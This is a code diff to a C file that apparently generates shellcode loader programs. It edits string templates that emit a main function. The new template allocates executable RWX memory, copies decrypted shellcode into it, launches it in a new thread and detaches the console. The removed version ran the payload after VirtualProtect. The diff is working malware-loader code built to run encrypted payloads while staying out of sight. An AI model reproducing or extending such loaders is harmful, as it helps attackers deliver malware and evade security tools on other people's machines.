@@ -5,24 +5,49 @@
 #include "Common.h"
 
 char _Main_Open[] =
+"// Thread function to execute the shellcode\n"
+"DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {\n"
+"	PBYTE shellcode = (PBYTE)lpParam;\n"
+"	// Execute the shellcode\n"
+"	void (*execShellcode)() = (void(*)())shellcode;\n"
+"	execShellcode();  // Execute the shellcode\n"
+"	return 0;\n"
+"}\n\n"
 "int main() {\n"
 ;
 
 char _Main_Close[] =
-"// Change memory protection to executable\n"
-"DWORD oldProtect;\n"
-"if (VirtualProtect(cipherText, sDSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {\n"
-"	printf(\"[!] VirtualProtect failed with error: %lu\", GetLastError());\n"
+"PBYTE execMem = (PBYTE)VirtualAlloc(NULL, sDSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n"
+"if (execMem == NULL) {\n"
+"	printf(\"[!] VirtualAlloc failed with error : % lu\", GetLastError());\n"
+	"HeapFree(GetProcessHeap(), 0, cipherText);\n"
+	"return -1;\n"
+"}\n"
+
+"// Copy the decrypted shellcode into the allocated memory\n"
+"memcpy(execMem, cipherText, sDSize);\n"
+
+"// Create a new thread to execute the shellcode\n"
+"HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, execMem, 0, NULL);\n"
+"if (hThread == NULL) {\n"
+"	printf(\"[!] CreateThread failed with error : % lu\", GetLastError());\n"
+"	VirtualFree(execMem, 0, MEM_RELEASE);\n"
 "	HeapFree(GetProcessHeap(), 0, cipherText);\n"
 "	return -1;\n"
 "}\n"
-"FreeConsole(); //Detach from the console\n"
-"// Cast the deobfuscated shellcode to a function and execute it\n"
-"void (*execShellcode)() = (void(*)())cipherText;\n"
-"execShellcode(); // Execute the shellcode\n"
+
+"FreeConsole();\n"
+
+"// Wait for the thread to complete\n"
+"WaitForSingleObject(hThread, INFINITE);\n"
+
+"// Cleanup\n"
+"CloseHandle(hThread);\n"
+"VirtualFree(execMem, 0, MEM_RELEASE);\n"
 "HeapFree(GetProcessHeap(), 0, cipherText);\n"
 
-"}\n"
+"return 0; \n"
+"}"
 ;
 
 char _GeneralHeader[] =
